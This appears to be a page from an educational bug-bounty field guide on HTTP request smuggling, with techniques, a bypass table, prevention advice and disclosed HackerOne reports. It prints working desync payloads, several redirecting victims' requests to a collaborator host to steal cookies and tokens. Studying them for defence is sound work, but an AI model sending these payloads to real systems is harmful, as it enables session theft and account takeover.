@@ -1,0 +1,775 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HTTP Request Smuggling · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>HTTP Request Smuggling</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="on" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>HTTP Request Smuggling</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>33</b></span><a class="chip lab" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Request smuggling</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>HTTP request smuggling (a.k.a. <strong>desync</strong>) exploits a <em>disagreement</em> between two HTTP servers on a shared, keep-alive connection about <strong>where one request ends and the next begins</strong>. A front-end (CDN / load-balancer / reverse proxy) and a back-end origin size the same request differently — one trusts <code>Content-Length</code> (CL), the other trusts <code>Transfer-Encoding: chunked</code> (TE) — so your trailing bytes are left in the socket buffer and <strong>prepended to the next victim's request</strong> on the reused backend connection.</p>
+<p>That primitive is a master key. Once you control the front of a stranger's request you can rewrite their request line to leak their session cookies / auth headers, redirect them off-site, poison a shared cache for <em>every</em> later visitor, or smuggle past front-end ACLs into internal origins. Smuggling lives at <strong>hop boundaries</strong>, never on a single server: you need two parsers that disagree, so always think in terms of <em>front-end parses X, back-end parses Y</em>.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find a hop boundary.</strong> Confirm there are two parsers on a shared socket: a CDN/LB in front of an origin, a reverse-proxy → app server, or an HTTP/2 → HTTP/1.1 downgrade point. Fingerprint the stack — Node/llhttp, Tomcat, Ruby WEBrick, Akamai, Cloudflare all have known desync CVEs.</li><li><strong>Timing probe first</strong> (safe, non-destructive). Send a request that a desync makes <em>hang</em> on the read timeout while a normal server answers fast. This tells you CL/TE disagree without poisoning anyone.</li><li><strong>Confirm with a differential probe.</strong> Send one request that a desynced backend will split, then a normal follow-up; if the follow-up gets a broken/<code>404</code> response, the socket is poisoned.</li><li><strong>Pick the split direction</strong> — CL.TE (front=CL, back=TE) or TE.CL (front=TE, back=CL) — and find the <strong>obfuscation byte</strong> the front-end rejects but the back-end honours.</li><li><strong>Aim the smuggled request at a high-value sink</strong> — a path that reflects <code>Host</code>/<code>X-Forwarded-Host</code> into a redirect or resource URL, or a request-storage endpoint.</li><li><strong>Catch a victim.</strong> Fire the desync then a <em>burst</em> of follow-up requests (Turbo Intruder) so a real victim connection lands on the poisoned socket. On your own test infra you are the victim; on production, only with explicit permission.</li></ol>
+<div class="pre" data-lang="http"># Timing probe — TE.CL. The front-end honours chunked and stops at the 0-chunk;
+# the back-end trusts Content-Length: 6, receives only 5 bytes, and hangs on the
+# read timeout waiting for the 6th. A stack with no CL/TE disagreement answers fast.
+POST / HTTP/1.1
+Host: TARGET
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X</div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>The victim-catching burst is <strong>destructive</strong> — it corrupts requests of real users sharing the socket. Run timing/differential probes to <em>prove</em> the desync, but never fire the poisoning burst against production without written authorization. On shared infra a single mistake breaks strangers' logins.</div></div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Every desync is a parser disagreement. Identify which side reads CL vs TE (or which line-ending / pseudo-header they split on), then use the matching body.</p>
+<h3 class="sub" id="cl-te-front-end-cl-back-end-chunked">CL.TE — front-end CL, back-end chunked</h3>
+<p>The front-end sizes the request by <code>Content-Length</code> and forwards <strong>everything</strong>; the back-end honours the (obfuscated) <code>Transfer-Encoding</code>, stops at the <code>0</code>-length chunk, and treats the remainder as a <strong>new request</strong> prepended to the next socket user. The winning obfuscation across the corpus is a <strong>space before the TE colon</strong> — the front-end rejects the malformed header and falls back to CL, the back-end still chunks.</p>
+<div class="pre" data-lang="http">GET / HTTP/1.1
+Transfer-Encoding : chunked
+Host: TARGET
+Content-Length: 83
+
+0
+
+GET https://COLLAB/ HTTP/1.1
+X: X</div>
+<p>The escalation that makes CL.TE critical: <strong>rewrite the victim's request line into an absolute-URL <code>GET</code></strong>. Hosts that answer <code>GET https://host/ HTTP/1.1</code> with a <code>301</code> to that host turn the desync into <em>universal credential exfiltration</em> — the victim's browser follows the redirect and replays its cookies / <code>X-Access-Token</code> to your collaborator.</p>
+<h3 class="sub" id="te-cl-front-end-chunked-back-end-cl">TE.CL — front-end chunked, back-end CL</h3>
+<p>The mirror image: the front-end honours the obfuscated TE, the back-end uses <code>Content-Length</code>. You must <strong>match the hex chunk size to the byte length</strong> of the smuggled request. Aim it at a path that reflects <code>Host</code> into a redirect or into page resource URLs for mass redirect / stored-XSS.</p>
+<div class="pre" data-lang="http">POST / HTTP/1.1
+Transfer-Encoding	:	chunked
+Host: TARGET
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+
+64
+POST /sf HTTP/1.1
+Host: COLLAB
+Content-Length: 15
+
+
+0
+
+</div>
+<h3 class="sub" id="te-te-duplicate-conflicting-transfer-encoding">TE.TE — duplicate / conflicting Transfer-Encoding</h3>
+<p>Both servers <em>support</em> TE but disagree on <strong>which occurrence wins</strong> when it appears twice, or on whether a bogus value counts. Send TE twice — one valid, one poisoned — and the front/back ends pick different ones (first-vs-last). Variants: <code>chunked</code> + <code>chunked-false</code>, <code>chunked</code> + <code>foo</code>, <code>chunked</code> + <code>identity</code>.</p>
+<div class="pre" data-lang="http">POST / HTTP/1.1
+Host: TARGET
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+1
+A
+0
+
+GET /admin HTTP/1.1
+Foo: bar</div>
+<h3 class="sub" id="bare-cr-bare-lf-line-ending-desync">Bare-CR / bare-LF line-ending desync</h3>
+<p>The dominant Node/llhttp bug pattern. One parser requires strict <code>CRLF</code>; the other accepts a <strong>lone LF or lone CR</strong> as a delimiter. Embed the wrong line-ending inside a benign header value to manufacture a hidden <code>Transfer-Encoding</code> header visible to <strong>only one side</strong>.</p>
+<div class="pre" data-lang="http"># Bare LF (0x0A, no CR) embedded in a header value. Send \n below as ONE raw LF byte:
+# the CRLF-strict front-end keeps it all as Fooz's value; the LF-lenient back-end
+# splits at the LF and parses a real Transfer-Encoding header, so only it chunks.
+POST /path HTTP/1.1
+Host: TARGET
+Content-Length: 77
+Fooz: bar\nTransfer-Encoding: chunked
+
+0
+
+GET http://COLLAB/ HTTP/1.1
+X: X</div>
+<div class="pre" data-lang="http"># Bare CR (0x0D, no LF) treated as a header terminator on lenient llhttp — send as the value:
+X-Abc:\rxTransfer-Encoding: chunked</div>
+<h3 class="sub" id="http-2-http-1-1-downgrade-injection">HTTP/2 → HTTP/1.1 downgrade injection</h3>
+<p>Downgrade hops are goldmines: a front-end that speaks HTTP/2 but re-serializes to HTTP/1.1 for the origin will faithfully copy control characters from the pseudo-headers into the HTTP/1.1 request line. Inject a <strong>space (or CR/LF) into <code>:method</code>, <code>:path</code>, or <code>:authority</code></strong> to smuggle a whole extra request line.</p>
+<div class="pre" data-lang="http">:method: GET /anything HTTP/1.1
+:path: /
+:authority: TARGET
+# re-serialized to the backend as:
+#   GET /anything HTTP/1.1 / HTTP/1.1
+#   Host: TARGET</div>
+<h3 class="sub" id="cdn-rule-engine-header-injection-smuggling">CDN rule-engine header injection → smuggling</h3>
+<p>Edge features that <em>build</em> header values (Cloudflare Transform Rules <code>concat()</code>/<code>lower()</code>, <code>host_header</code> actions) are a CRLF-injection surface that <strong>manufactures a TE header at the edge</strong>. If the string function accepts hex/unicode escapes or raw CRLF, you inject <code>Transfer-Encoding</code> into the request the CDN forwards, then smuggle past edge auth (e.g. Cloudflare Access) into internal origins.</p>
+<div class="pre" data-lang=""># Cloudflare Transform-Rule value that injects a newline + TE header before the
+# origin sees it. \x0d\x0a is sent literally in the rule string (a raw CRLF):
+concat("-", "\x0d\x0aTransfer-Encoding: chunked")</div>
+<h3 class="sub" id="response-smuggling-queue-poisoning">Response smuggling / queue poisoning</h3>
+<p>Smuggling is not only request-side. If a <strong>client library's response parser is laxer than the fronting proxy</strong> — accepts a bare CR in the status line, non-CRLF-terminated headers — a malicious or compromised upstream can desync the <strong>response queue</strong>, serving one client another's response.</p>
+<div class="pre" data-lang="http">HTTP/1.1 200 OK\rContent-Length: 4\r\n\r\nEvil</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<p>Each parser-split obfuscation, tagged with the report it was seen in. Try each byte between <code>Transfer-Encoding</code> and <code>chunked</code>, and each line-ending variant.</p>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Front-end rejects malformed TE</td><td>Space before the colon: <code>Transfer-Encoding : chunked</code> (front falls back to CL, back chunks)</td><td>#737140</td></tr><tr><td>CDN TE normalization (Akamai)</td><td>Tab after the colon: <code>Transfer-Encoding:\tchunked</code></td><td>#771666</td></tr><tr><td>CDN TE normalization</td><td>Tabs around the colon: <code>Transfer-Encoding\t:\tchunked</code></td><td>#1063627</td></tr><tr><td>Front reflects Host into cached resources</td><td>Space-before-colon TE + Host-reflecting path (WordPress/Yoast)</td><td>#726773</td></tr><tr><td>Duplicate-TE dedupe (first-vs-last)</td><td>Valid + invalid TE: <code>chunked</code> then <code>foo</code> / <code>identity</code></td><td>#867577</td></tr><tr><td>Strict CRLF header parsing</td><td>Bare LF hides a TE header inside a benign one</td><td>#526880</td></tr><tr><td>Strict CRLF header parsing (llhttp)</td><td>Bare CR (no LF) treated as a header delimiter</td><td>#2032842</td></tr><tr><td>TE value equality check</td><td>List value <code>chunked, eee</code> still parsed as chunked</td><td>#735748</td></tr><tr><td>Edge auth (Cloudflare Access)</td><td>Hex-escaped CRLF in <code>concat()</code> injects a TE header at the edge</td><td>#1478633</td></tr><tr><td>Proxy ACL keyed on request line</td><td>HTTP/2 <code>:method</code> with spaces injects an HTTP/1.1 request line on downgrade</td><td>#1391549</td></tr><tr><td>Reverse-proxy path ACL (<code>/flag</code>)</td><td>Duplicate TE (<code>chunked</code> + <code>chunked-false</code>) desyncs HAProxy → Node</td><td>#1002188</td></tr></tbody></table></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>One desync, several escalations — pick the one your sink supports:</p>
+<ul><li><strong>Desync → request-line rewrite → 301 → cookie/token theft → account takeover.</strong> Rewrite the victim's request into an absolute-URL <code>GET</code>; the backend <code>301</code>s to it and the browser replays session cookies / <code>X-Access-Token</code> to your collaborator. The dominant, critical outcome (<code>#737140</code> Slack <code>d</code> cookie; <code>#771666</code> API <code>X-Access-Token</code>).</li><li><strong>Desync → <code>X-Forwarded-Host</code> redirect</strong> — smuggle an <code>X-Forwarded-Host: attacker.com</code> request so the app redirects the victim off-site.</li><li><strong>Desync → capture-and-reflect.</strong> Smuggle a storage write (e.g. <code>POST /identity</code>) that saves the <em>next</em> victim's full request, then read their session cookies back out of the stored object (<code>#867577</code>).</li><li><strong>Desync → persistent cache poisoning.</strong> If a cache sits in front, cache the smuggled redirect (or <code>Host</code> reflected into <code>&lt;script&gt;</code>/<code>&lt;link&gt;</code> src) so a per-connection race becomes <strong>mass exploitation</strong> for every later visitor — a JS supply-chain hijack (<code>#726773</code>).</li><li><strong>Smuggling → front-end ACL / auth bypass.</strong> Reach a proxy-denied <code>/flag</code> or <code>/admin</code>, or bypass edge auth (Cloudflare Access) into internal origins (<code>#1478633</code>).</li><li><strong>Client-side desync</strong> — an incomplete POST leaks the prior request even without a shared backend socket, so no victim burst is needed.</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Normalize or reject ambiguity at the front-end.</strong> Reject any request carrying both CL and TE, duplicate TE, obfuscated TE (spaces/tabs around the colon), or bare CR/LF line endings. The entire bypass table dies if the edge enforces strict RFC parsing — which is exactly how the Node/llhttp, Tomcat, and WEBrick CVEs were patched.</li><li><strong>Use HTTP/2 end-to-end</strong> (or one upstream connection per client) so there is <strong>no shared backend socket</strong> to poison and no downgrade point to inject into.</li><li><strong>Origins must independently validate edge auth</strong> — verify the CF Access JWT rather than trusting the edge — so a smuggled request that skips the CDN still fails at the origin.</li><li><strong>Don't reflect <code>Host</code>/<code>X-Forwarded-Host</code> into redirects or resource URLs</strong> — this removes the escalation sink even if a residual desync exists. A hang on the timing probe with no reachable Host-reflecting sink and no fronting cache is often a non-exploitable variant.</li></ul>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Fingerprint the stack <em>before</em> fuzzing. A large share of real desyncs are just a known CVE in Node/llhttp, Tomcat, or a CDN — match the server version to the published parser bug and you already know which obfuscation byte to send.</div></div>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>smuggler.py</strong> — automated CL/TE differential probing; its <code>space1</code> / <code>tabprefix1</code> test names map directly to the obfuscations above.</li><li><strong>Burp HTTP Request Smuggler</strong> (Albinowax) — detection + guided exploitation, timing and differential probes.</li><li><strong>Turbo Intruder</strong> — the victim-catching request burst (fire one desync, then ~15 rapid follow-ups).</li><li><strong>Burp Collaborator / interactsh</strong> — out-of-band callback for the smuggled absolute-URL redirect.</li><li><strong>h2csmuggler</strong> / HTTP/2 tooling — for downgrade-hop injection via pseudo-headers.</li><li><strong>socat</strong> — bounce a smuggled <code>302</code> to your HTTPS listener when the target speaks 443.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>33</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-737140" style="--sv:var(--sev-crit)" data-sev="4" data-votes="867" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CL.TE socket poisoning -&gt; forced open-redirect -&gt; mass cookie theft</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#737140</b> · slack · awarded · 867 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Chain <b>CL.TE desync -&gt; request-line rewrite -&gt; backend 301 op</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Frontend sizes the request by Content-Length while the backend honours an obfuscated Transfer-Encoding (space before the colon: 'Transfer-Encoding : chunked'), leaving leftover bytes to prepend to the next victim request on the shared backend socket.</p>
+<h4>Method</h4><ol><li>Run smuggler/desync probes; 'space1' (space before TE colon) test flags a CL.TE</li><li>Craft a smuggled request whose trailing line rewrites the victim's request to GET &lt;collab-URL&gt;</li><li>Backend returns 301 to that URL and the victim's browser follows it, replaying its Slack cookies (the 'd' session cookie) to attacker collaborator</li><li>Collect cookies at scale -&gt; full account takeover</li></ol>
+<div class="pre">GET / HTTP/1.1
+Transfer-Encoding : chunked
+Host: slackb.com
+User-Agent: Smuggler/v1.0
+Content-Length: 83
+
+0
+
+GET &lt;COLLAB_URL&gt; HTTP/1.1
+X: X</div>
+<p class="insight"><b>Insight —</b> When a domain answers 'GET https://host/ HTTP/1.1' with a 301 to that host, a desync that rewrites the victim's request line into an absolute-URL GET turns request smuggling into universal credential exfiltration (cookies ride along on the redirect).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/737140" target="_blank" rel="noopener">hackerone.com/reports/737140</a></span><a class="src" href="#report-737140" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: cl.te</a></div></article>
+<article class="spec" id="report-771666" style="--sv:var(--sev-crit)" data-sev="4" data-votes="559" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CL.TE tab-obfuscated TE -&gt; bulk X-Access-Token theft</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#771666</b> · eternal · awarded · 559 votes · resolved</div>
+<div class="taxo"><span>Program <b>eternal</b></span><span>Surface <b>api</b></span><span>Chain <b>CL.TE desync -&gt; smuggled absolute-URL GET -&gt; backend 3</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A tab after the Transfer-Encoding colon ('Transfer-Encoding:\tchunked') is rejected by the Akamai frontend (falls back to Content-Length) but honoured as chunked by the backend, poisoning the backend socket.</p>
+<h4>Method</h4><ol><li>Fuzz TE mutations; 'tabprefix1' (tab after colon) flags CL.TE</li><li>Set CL to cover a smuggled absolute-URL GET line with no trailing CRLF so it merges onto the victim's request</li><li>Backend 301-redirects the victim (with its X-Access-Token header) to the attacker collaborator</li><li>Use stolen X-Access-Token + UserID to read PII or fully impersonate the mobile-app session</li></ol>
+<div class="pre">DELETE / HTTP/1.1
+Transfer-Encoding:	chunked
+Host: api.zomato.com
+Content-Length: 91
+User-Agent: Treasure/6.7
+
+0
+
+GET https://&lt;COLLAB_URL&gt;/desync/ HTTP/1.1
+X: X</div>
+<p class="insight"><b>Insight —</b> Absolute-URL in the smuggled request line that the frontend would 404 gets 301'd by the backend; API auth headers (X-Access-Token) travel with the redirect. Tab is a strong TE-obfuscation byte against CDN frontends (Akamai).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/771666" target="_blank" rel="noopener">hackerone.com/reports/771666</a></span><a class="src" href="#report-771666" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: cl.te</a></div></article>
+<article class="spec" id="report-1478633" style="--sv:var(--sev-crit)" data-sev="4" data-votes="115" data-bounty="6000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CDN rule-engine header injection via concat() hex escapes -&gt; TE.CL smuggling (Cloudflare)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1478633</b> · cloudflare · 6000 · 115 votes · resolved</div>
+<div class="taxo"><span>Program <b>cloudflare</b></span><span>Surface <b>web</b></span><span>Chain <b>rule-engine CRLF injection -&gt; TE header injection -&gt; T</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Cloudflare Transform Rules' Edge string functions (concat/lower) accepted hexadecimal escapes like backslash-x0d backslash-x0a with no output sanitization, letting an attacker inject CRLF and a Transfer-Encoding header into the request Cloudflare forwards to the origin.</p>
+<h4>Method</h4><ol><li>Create a dynamic header-rewrite Transform Rule with value concat('-', hexCRLF + 'Transfer-Encoding: chunked')</li><li>Cloudflare emits the injected newline + TE header to the origin</li><li>Send a POST body '0 CRLF CRLF GET / HTTP/1.1 CRLF Host: internal...' to smuggle to internal origins and bypass Cloudflare Access</li></ol>
+<div class="pre">concat("-", "\x0d\x0aTransfer-Encoding: chunked")
+
+(body) 0
+
+GET / HTTP/1.1
+Host: internal.example.com</div>
+<p class="insight"><b>Insight —</b> CDN/edge configuration features that build header values (concat, string funcs, host_header actions) are a header-injection surface: if they accept hex/unicode escapes or raw CRLF you can inject Transfer-Encoding and smuggle past edge auth (CF Access). Origins must validate the CF Access JWT, not trust the edge.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1478633" target="_blank" rel="noopener">hackerone.com/reports/1478633</a></span><a class="src" href="#report-1478633" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/request-smuggling/exploiting" target="_blank" rel="noopener">⚑ Lab: te.cl</a></div></article>
+<article class="spec" id="report-735748" style="--sv:var(--sev-crit)" data-sev="4" data-votes="104" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TE list value 'chunked, eee' still parsed as chunked (Node CVE-2019-15605)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#735748</b> · nodejs · awarded · 104 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs</b></span><span>Surface <b>other</b></span><span>Tag <b>cache</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Node's http_parser accepted a Transfer-Encoding value containing 'chunked' plus extra tokens (e.g. 'chunked, eee') and processed the body as chunked, while a stricter proxy would reject/ignore it -&gt; TE/CL desync.</p>
+<h4>Method</h4><ol><li>Send POST with both Content-Length and 'Transfer-Encoding: chunked, eee'</li><li>Node treats it as chunked and reads the smuggled second request as a new request</li><li>Server writes two responses on the wire -&gt; desync behind any LB that disagrees</li></ol>
+<div class="pre">POST / HTTP/1.1
+Host: hacker.exploit.com
+Content-Length: 10
+Transfer-Encoding: chunked, eee
+
+HELLOWORLDPOST / HTTP/1.1
+Content-Length: 30
+
+I AM A SMUGGLED REQUEST!!!</div>
